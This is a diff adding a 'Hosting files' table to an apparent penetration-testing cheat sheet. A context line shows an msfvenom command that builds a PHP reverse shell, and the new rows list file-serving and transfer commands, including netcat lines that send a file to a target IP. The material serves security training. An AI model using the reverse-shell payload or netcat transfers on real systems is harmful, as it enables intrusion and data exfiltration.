@@ -343,5 +343,18 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 #### Hosting files
 | Command  | Description |
 | ------------- | ------------- |
-| python -m SimpleHTTPServer [PORT]             | Content Cell  |
-| python3 -m http.server [PORT]                 | Content Cell  |
+| python -m SimpleHTTPServer [PORT] | Python HTTP Server modules |
+| python3 -m http.server [PORT]	| Python HTTP Server modules |
+| service apache2 start; systemctl start apache2;	| Apache web server, requires to place files in the /var/www/html/ directory |
+| service nginx start; systemctl start nginx	| Nginx web server, requires to place files in or /usr/share/nginx/html or /var/www/html |
+| php -S 0.0.0.0:PORT	| PHP builtin web server bundle |
+| nc -q 0 -lvp 443 < file	| Netcat listener to transfer files |
+| nc -nv IP_ADDR 443 < file	| Netcat command to send files |
+| smbserver.py SHARE share_dir	| Impacket’s smbserver.py script simulates a SMB server |
+| service smbd start; systemctl start smbd	| Linux Samba, a share has to be added to /etc/samba/smb.conf |
+| service pure-ftpd start; systemctl start pure-ftpd; service proftpd start; systemctl start proftpd	| Services such as pure-ftpd and proftpd can be used to setup FTP servers |
+| atftpd –daemon –port 69 ftp_dir	| The atftpd utility allows to easily setup a TFTP server |
+| ruby -rwebrick -e’WEBrick::HTTPServer.new(:Port => PORT, :DocumentRoot => Dir.pwd).start’	| Ruby web server using the Web brick library |
+| ruby -run -e httpd . -p [PORT]	| Ruby simple http server |
+| “C:\Program Files (x86)\IIS Express\iisexpress.exe” /path:C: /port:PORT	| Microsoftg IIS Express |
+| base64 file;	| Encoding the the file using base 64 and decoding it in the target machine |
